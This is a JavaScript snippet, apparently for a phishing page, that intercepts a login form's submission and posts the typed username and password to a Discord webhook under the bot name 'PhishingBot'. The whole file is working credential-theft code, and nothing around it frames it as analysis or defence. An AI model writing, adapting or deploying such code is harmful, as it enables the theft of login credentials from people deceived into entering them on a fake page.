document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();

  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;

  // Send credentials to Discord server using webhook
  fetch('https://discord.com/api/webhooks/1234179059454443691/Pfc8mhOFP0QCyNc1a4SyMfh7PbmGRfEMAmAGfcF6ZQT2jAv0nOdsilkSpEmAjZQYTkWu', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username: 'PhishingBot',
      avatar_url: 'https://link-to-an-avatar-image.com',
      content: `Username: ${username}\nPassword: ${password}`,
    }),
  });
});